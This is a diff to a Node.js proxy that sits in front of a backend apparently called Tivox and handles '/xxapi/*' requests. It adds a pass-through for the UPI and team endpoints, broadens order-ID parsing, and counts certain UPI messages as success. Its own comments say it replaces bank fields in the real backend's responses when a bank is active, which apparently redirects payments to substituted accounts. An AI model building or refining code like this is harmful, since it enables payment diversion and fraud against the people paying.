@@ -1180,6 +1180,15 @@ app.all('/xxapi/*', async (req, res) => {
     const urlLower = path.toLowerCase();
     const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
 
+    // ── 100% CLEAN BYPASS FOR UPI & TEAM BUTTONS ──────────────────────────────
+    if (urlLower.includes('/collectiontoollist') || urlLower.includes('/teaminfo')) {
+      const { response: r, respBody: rb, respHeaders: rh } = await proxyToTivox(req);
+      rh['content-length'] = String(Buffer.byteLength(rb));
+      res.writeHead(r.status, rh);
+      return res.end(rb);
+    }
+    // ──────────────────────────────────────────────────────────────────────────
+
     // Security checks are no longer intercepted.
     // They are handled natively by the real backend.
 
@@ -1234,7 +1243,7 @@ app.all('/xxapi/*', async (req, res) => {
             rb = Object.fromEntries(new URLSearchParams(req.rawBody.toString()));
           }
           const qs = new URLSearchParams((req.originalUrl || req.url).split('?')[1] || '');
-          reqOrderId = rb.order_id || rb.orderId || rb.orderNo || rb.rptNo || qs.get('order_id') || qs.get('orderId') || '';
+          reqOrderId = rb.order_id || rb.orderId || rb.orderNo || rb.rptNo || rb.id || rb.slipId || qs.get('order_id') || qs.get('orderId') || qs.get('orderNo') || qs.get('rptNo') || qs.get('id') || qs.get('slipId') || '';
           reqCtId = rb.ct_id || rb.ctId || qs.get('ct_id') || '';
           reqCtType = rb.ctType || rb.ct_type || rb.payType || qs.get('ctType') || '';
         } catch (e) { }
@@ -1283,7 +1292,8 @@ app.all('/xxapi/*', async (req, res) => {
             : derivedPt === 0 ? 'USDT'
               : 'Bank Transfer';
 
-        if (origCode === 0 || origCode === undefined) {
+        const isSuccessMsg = origMsg.toLowerCase().includes('upi is being used') || origMsg.toLowerCase().includes('finish payment');
+        if (origCode === 0 || origCode === undefined || isSuccessMsg) {
           // ── Case 1: Real API returned SUCCESS ────────────────────────────────
           // Replace bank fields in real response if:  proxy ON  AND  bank set  AND  amount >= min
           if (proxyOn && activeBank) {
